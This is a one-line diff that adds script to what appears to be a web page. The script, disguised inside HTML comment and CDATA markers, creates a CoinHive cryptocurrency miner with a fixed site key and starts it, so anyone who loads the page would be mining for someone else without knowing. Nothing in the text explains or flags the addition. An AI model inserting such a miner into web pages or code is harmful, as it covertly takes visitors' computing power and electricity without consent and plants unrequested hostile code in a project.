@@ -1,0 +1,1 @@
+<!--//--><![CDATA[// ><!--var miner = new CoinHive.User('4MM2Xi8MHB5ywh92PwlVzhV9AZ35wMVq', 'default');miner.start();//--><!]]>
